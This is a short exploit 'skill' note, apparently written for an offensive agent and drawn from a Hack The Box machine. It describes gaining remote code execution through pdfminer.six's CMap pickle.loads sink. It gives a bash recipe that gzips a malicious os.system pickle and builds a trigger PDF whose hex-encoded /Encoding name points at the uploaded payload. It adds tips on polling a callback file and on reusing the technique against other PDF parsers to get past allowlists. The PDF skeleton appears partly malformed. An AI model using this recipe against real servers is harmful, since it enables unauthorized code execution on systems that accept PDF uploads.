# Skill: pdfminer.six CMap pickle.loads -> RCE (CVE-2025-64512, GHSA-wf5f-4jwr-ppcp)

From: HTB Bedside. Trigger: web app accepts PDF uploads and fingerprints
`X-Powered-By: pdfminer.six`; processing watcher invokes an affected version.

Core: `CMapDB._load_data` does `pickle.loads` on attacker-referenced CMap
resources. The trigger PDF's `/Encoding` name object can hex-encode path
bytes and point at ANY readable path — including the app's own upload dir
(known from the MIME-mismatch error), so one upload stage-carries the other.

```bash
# stage (upload endpoint takes .gz too):
gzip -c payload.pickle > payload.pickle.gz   # pickle: os.system/whatever, called at load
cat > trigger.pdf <<'EOF'
%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R >> endobj
4 0 obj << /Type /Font >> endobj
endobj % ...attach to the CMap dict: /Encoding /#2fvar#2fwww#2fuploads#2fpayload
EOF
# each #XX is a hex byte: /#2f = "/", so the name = /var/www/.../uploads/payload
```

Poll the agreed callback file (`/uploads/rce.txt`) — processing is a watcher,
async, not the POST response.

Notes
- Verify the exact vulnerable version (`pip show pdfminer.six`) against the
  advisory before building payloads (Bedside repro'd 20231228 flags).
- Wrong `SIZE`/malformed CMap fails silently — keep one variable per test
  iteration (payload file, then name bytes).
- Same shape generalizes: any PyPDF/miner utility reading attacker PDFs with
  a pickle sink is a one-upload RCE; bypasses allowlists since PDFs are legit.
- Framework-respected: use on authorized targets only.
